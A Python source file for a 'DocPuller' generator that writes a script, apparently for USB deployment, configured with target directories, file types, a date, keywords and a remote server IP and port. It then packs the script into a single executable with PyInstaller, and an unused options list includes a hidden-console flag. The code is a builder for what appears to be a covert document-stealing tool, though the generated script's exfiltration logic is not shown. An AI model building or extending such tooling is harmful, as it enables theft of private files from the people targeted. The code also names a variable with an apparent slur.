import subprocess

from Generator.DocPullerScriptGenerator import ScriptGen


class DocPullerGenerator:

    def __init__(self, save_dir, is_usb, direcoties, file_type, date, keywords, server_ip, server_port):
        self.save_dir = save_dir
        self.is_usb = is_usb
        self.direcoties = direcoties
        self.file_type = file_type
        self.date = date
        self.keywords = keywords
        self.server_ip = server_ip
        self.server_port = server_port
        self.DOCPULLER_SCRIPT = 'docpullerscrip.py'

        # Specify additional PyInstaller options if needed
        self.options = [
            "--onefile",
            "--noconsole",
            f"--distpath={self.save_dir}",
            f'--add-data /DocPullerScripts'
        ]

        ScriptGen(is_usb, direcoties, file_type, date, keywords, server_ip, server_port).write_to_file()

    def main(self):
        if self.is_usb:
            print('genarating exe')

            command = ["pyinstaller",'--console','--onefile',f"--distpath={self.save_dir}",self.DOCPULLER_SCRIPT]
            nig=subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             universal_newlines=True)
            nig.communicate()
            print(nig)
